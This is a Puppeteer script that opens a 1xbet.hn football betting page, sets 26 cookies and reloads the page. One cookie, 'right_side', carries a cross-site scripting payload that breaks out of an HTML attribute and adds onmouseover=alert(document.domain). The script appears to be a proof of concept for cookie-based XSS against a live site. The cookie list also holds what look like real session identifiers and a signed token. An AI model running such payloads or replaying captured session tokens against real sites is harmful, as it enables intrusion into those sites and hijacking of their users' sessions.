const puppeteer = require('puppeteer');

async function run() {
  // Launch Chrome browser
  const browser = await puppeteer.launch({
    headless: false, // Set to false to see the browser action
    defaultViewport: null,
    args: ['--start-maximized']
  });

  // Open a new page
  const page = await browser.newPage();

  // Define the URL
  const url = 'http://1xbet.hn/es/line/football/110163-italy-serie-a/211422495-napoli-bologna-1909';

  // Navigate to the URL
  await page.goto(url, { waitUntil: 'networkidle2' });

  // Define the cookies
  const cookies = [
    { domain: ".1xbet.hn", expirationDate: 1753015015.930077, hostOnly: false, httpOnly: false, name: "_ga", path: "/", sameSite: "unspecified", secure: false, session: false, storeId: "0", value: "GA1.1.1009435905.1718450183", id: 1 },
    { domain: ".1xbet.hn", expirationDate: 1753015015.92015, hostOnly: false, httpOnly: false, name: "_ga_7V60YW2S5H", path: "/", sameSite: "unspecified", secure: false, session: false, storeId: "0", value: "GS1.1.1718454782.3.1.1718455015.44.0.0", id: 2 },
    { domain: ".1xbet.hn", expirationDate: 1753015015.933833, hostOnly: false, httpOnly: false, name: "_ga_YJH678L4C3", path: "/", sameSite: "unspecified", secure: false, session: false, storeId: "0", value: "GS1.1.1718454782.3.1.1718455015.0.0.0", id: 3 },
    { domain: ".1xbet.hn", expirationDate: 1718541301, hostOnly: false, httpOnly: false, name: "_gid", path: "/", sameSite: "unspecified", secure: false, session: false, storeId: "0", value: "GA1.2.1986923743.1718450184", id: 4 },
    { domain: ".1xbet.hn", expirationDate: 1749986183, hostOnly: false, httpOnly: false, name: "_ym_d", path: "/", sameSite: "no_restriction", secure: true, session: false, storeId: "0", value: "1718450184", id: 5 },
    { domain: ".1xbet.hn", expirationDate: 1718522184, hostOnly: false, httpOnly: false, name: "_ym_isad", path: "/", sameSite: "no_restriction", secure: true, session: false, storeId: "0", value: "2", id: 6 },
    { domain: ".1xbet.hn", expirationDate: 1749986183, hostOnly: false, httpOnly: false, name: "_ym_uid", path: "/", sameSite: "no_restriction", secure: true, session: false, storeId: "0", value: "1718450184886521689", id: 7 },
    { domain: ".1xbet.hn", expirationDate: 1718456698, hostOnly: false, httpOnly: false, name: "_ym_visorc", path: "/", sameSite: "no_restriction", secure: true, session: false, storeId: "0", value: "b", id: 8 },
    { domain: "1xbet.hn", expirationDate: 1718458599.269635, hostOnly: true, httpOnly: false, name: "_glhf", path: "/", sameSite: "unspecified", secure: false, session: false, storeId: "0", value: "1718472774", id: 9 },
    { domain: "1xbet.hn", hostOnly: true, httpOnly: true, name: "auid", path: "/", sameSite: "unspecified", secure: true, session: true, storeId: "0", value: "LYd5KmZteAJSCh/7BCH2Ag==", id: 10 },
    { domain: "1xbet.hn", expirationDate: 1718458379, hostOnly: true, httpOnly: false, name: "coefview", path: "/", sameSite: "unspecified", secure: false, session: false, storeId: "0", value: "0", id: 11 },
    { domain: "1xbet.hn", hostOnly: true, httpOnly: false, name: "completed_user_settings", path: "/", sameSite: "unspecified", secure: false, session: true, storeId: "0", value: "true", id: 12 },
    { domain: "1xbet.hn", expirationDate: 1719054978, hostOnly: true, httpOnly: false, name: "fast_coupon", path: "/", sameSite: "unspecified", secure: false, session: false, storeId: "0", value: "true", id: 13 },
    { domain: "1xbet.hn", expirationDate: 1721046999.270174, hostOnly: true, httpOnly: false, name: "flaglng", path: "/", sameSite: "unspecified", secure: false, session: false, storeId: "0", value: "es", id: 14 },
    { domain: "1xbet.hn", hostOnly: true, httpOnly: false, name: "ggru", path: "/", sameSite: "unspecified", secure: false, session: true, storeId: "0", value: "195", id: 15 },
    { domain: "1xbet.hn", expirationDate: 1718464589, hostOnly: true, httpOnly: false, name: "hdt", path: "/", sameSite: "unspecified", secure: true, session: false, storeId: "0", value: "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJndWlkIjoiQUd4bUdiL1lPcFRkTkhadDNvSnJBWis3NitNd1djMTEyUzNUTzJWdk93UmhOT1ZmVS9lcVVjczN3cllXMnhtd3JXOHkxd2RadTluTkU1MzNqZG1zR25Pb2VvMlc1eXpyT3ZZMEhSTGhvakVYMTJ6NGFZZlJwdTFPakJhdVhRTjJwMmxoWE5sOU5yL2NrRUZiTkVYMnpXMjZvMW5DVlhGcEtmQUdXMk1WUUcxQVUxeElYeG5sWW5ZckZjcWZnc2pXREdGOWR2WklqclZoUjkwdTkycm1xRkNXMDdhVm9lbm9hQWxHaE5wblJBU1BMQnY4M3lJYU56M25GeUJiRWtzRzBvZS9uelRjRDgyeW9LKytHeEh2QlBiNVZCSzNxeUpRcUNMOFFrM3JhYTgwVy9YKzhOTXEwRDY5L0VtTWVmOFdwMDBOS2NxWGhoTFZ2dmttdjFPang5WStNNG9mN29FMkZhYmJRKzA1T2NUM3F3Mk5jenkzQkpiMHB1bEM0QUdlNGZKM3lXTi9BQUxBMFlna2FCeE03NGoza3VZPSIsImV4cCI6MTcxODQ2NDU5MCwiaWF0IjoxNzE4NDUwMTkwfQ.DMDdndA2YptA6xdGlg1-VulyY870DMw776rPaWg5ZT6HIbkixiiwDc9VkrosU0qCAh9iC4FCv03NVv3Yr35csg", id: 16 },
    { domain: "1xbet.hn", expirationDate: 1749990999.270017, hostOnly: true, httpOnly: true, name: "is_rtl", path: "/", sameSite: "unspecified", secure: false, session: false, storeId: "0", value: "1", id: 17 },
    { domain: "1xbet.hn", expirationDate: 1721042178, hostOnly: true, httpOnly: false, name: "lng", path: "/", sameSite: "unspecified", secure: false, session: false, storeId: "0", value: "es", id: 18 },
    { domain: "1xbet.hn", expirationDate: 1719054990, hostOnly: true, httpOnly: false, name: "perf_dv6Tr4n", path: "/", sameSite: "unspecified", secure: false, session: false, storeId: "0", value: "1", id: 19 },
    { domain: "1xbet.hn", hostOnly: true, httpOnly: true, name: "right_side", path: "/", sameSite: "unspecified", secure: false, session: true, storeId: "0", value: "right%22%20onmouseover=alert(document.domain)%20x=%22", id: 20 },
    { domain: "1xbet.hn", hostOnly: true, httpOnly: true, name: "SESSION", path: "/", sameSite: "unspecified", secure: true, session: true, storeId: "0", value: "af67aed5454ca4166d4257509fc38cef", id: 21 },
    { domain: "1xbet.hn", expirationDate: 1749990791, hostOnly: true, httpOnly: false, name: "sh.session.id", path: "/", sameSite: "unspecified", secure: false, session: false, storeId: "0", value: "c7b67541-232d-4188-a9c1-0279d88d9d32", id: 22 },
    { domain: "1xbet.hn", expirationDate: 1734002178, hostOnly: true, httpOnly: false, name: "typeBetNames", path: "/", sameSite: "unspecified", secure: false, session: false, storeId: "0", value: "full", id: 23 },
    { domain: "1xbet.hn", hostOnly: true, httpOnly: false, name: "tzo", path: "/", sameSite: "unspecified", secure: false, session: true, storeId: "0", value: "5.5", id: 24 },
    { domain: "1xbet.hn", expirationDate: 1718709378, hostOnly: true, httpOnly: true, name: "v3fr", path: "/", sameSite: "unspecified", secure: false, session: false, storeId: "0", value: "1", id: 25 },
    { domain: "1xbet.hn", hostOnly: true, httpOnly: true, name: "visit", path: "/", sameSite: "unspecified", secure: false, session: true, storeId: "0", value: "1-455d7e137f3e99d0d6f6166f76e4e463", id: 26 }
  ];

  // Set the cookies
  await page.setCookie(...cookies);

  // Refresh the page to apply the cookies
  await page.reload({ waitUntil: 'networkidle2' });

  // Close the browser after some time (optional)
  // await browser.close();
}

run();
